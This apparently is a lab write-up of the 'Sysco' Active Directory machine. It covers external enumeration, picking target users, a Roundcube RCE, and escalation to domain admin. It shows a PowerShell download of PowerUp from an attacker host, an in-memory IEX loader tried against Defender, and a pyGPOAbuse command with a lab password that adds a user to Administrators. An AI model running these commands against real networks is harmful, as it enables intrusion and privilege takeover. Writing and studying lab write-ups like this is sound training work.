...
description: "Sysco - Medium rated Active Directory Machine by Luis Moret (LainKusanagi)"
published: true
---

# Scenario 
> Sysco is a managed service provider that engaged us to perform an external penetration test against their Active Directory environment. From an external vantage, the assessment simulates a realistic, determined adversary: enumerate public-facing services and web assets to harvest usernames, gain an initial foothold, move laterally through the network, and escalate privileges to achieve Domain Administrator access. Because EDR/AV is present, the engagement emphasizes living‑off‑the‑land techniques and low‑noise operations while thoroughly documenting findings and artifacts.
...
```go
nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN "/home/kali/Documents/Obsidian/HackSmarter/Sysco/External/enum/results/10.1.43.102/scans/_full_tcp_nmap.txt" $IP
...
1. Sarah Johnson — Sales Rep 
   - Likely low-privilege user; good initial target for credential harvesting or phishing in a real engagement.

2. Jack Downland — Helpdesk Associate   
   - Likely low privs; L1 but may have access to shared assets.

3. Lainey Moore — Systems Engineer 
   - Elevated permissions; potential access to serverservice accounts.

4. Greg Shields — System Administrator  
   - High-value target (possible domain or local admin). Probably final escalation objective.

> Mapping the users like this help map shortest paths to high‑value principals.
...
- Checked source code for version, but didn't find any. From OSCP prep... I know 1.6.10 < is vuln to RCE.
...
With creds, we can:
 - Attempt to login to that roundcube instance on port 80.
 - Start Bloodhound and mark `jack.dowland` as owned. 
...
> IppSec covers it [here](https://www.youtube.com/watch?v=-JM--KfVhpA&t=830s)
...
- We know Lainey is a systems engineer above Jack.
...
## Priv-esc
----
We've established access as `Lainey` and identified `Greg` (the Sys Admin) as our next target. Checking Lainey's group memberships reveals they belong to `RDP Users` and `Windows Remote Management users`.

### Powerup.ps1

Initial transfer attempt using `iwr` worked but 
``` powershell
Invoke-Webrequest "http://myip/powerup.ps1 -outfile powerup.ps1"
```
 was blocked by Windows Defender's real-time protection.
![Defender](/assets/images/AV-Block.png)
*Transfer worked (200 request), execution did not*

Pivoted to a fileless execution approach using `IEX (New-Object Net.WebClient).DownloadString()` to load PowerUp directly into memory, but this was also intercepted.

### Since `lainey` has RDP privs, I use [Remmina](https://github.com/scibian/remmina) to RDP in
...
- Initially, I thought pivoting internally would be the next step based on the new found subnet(10.0.0.1) so I prep [Ligolo](https://github.com/nicocha30/ligolo-ng)
   - Before that, I spray this password against the other known-users. Since user here is `netadmin` I add it my `user.txt` but we know that's an internal subnet.
...
`Greg.Shields` → member of → `GROUP POLICY CREATOR OWNERS@SYSCO.LOCAL` → this group has control over `DEFAULT DOMAIN POLICY@SYSCO.LOCAL`
...
> [GPOAbuse options from TheHackerRecipes](https://www.thehacker.recipes/ad/movement/group-policies)

![HackSmarterGPO](/assets/images/GPOAbuseOptions.png)

#### [PyGPOAbuse.py](https://github.com/Hackndo/pyGPOAbuse/tree/master)
...
```zsh
❯ python pygpoabuse.py 'SYSCO.LOCAL'/'greg.shields':'5y5coSmarter2025!!!' -gpo-id '31B2F340-016D-11D2-945F-00C04FB984F9' -command 'net localgroup Administrators greg.shields /add'
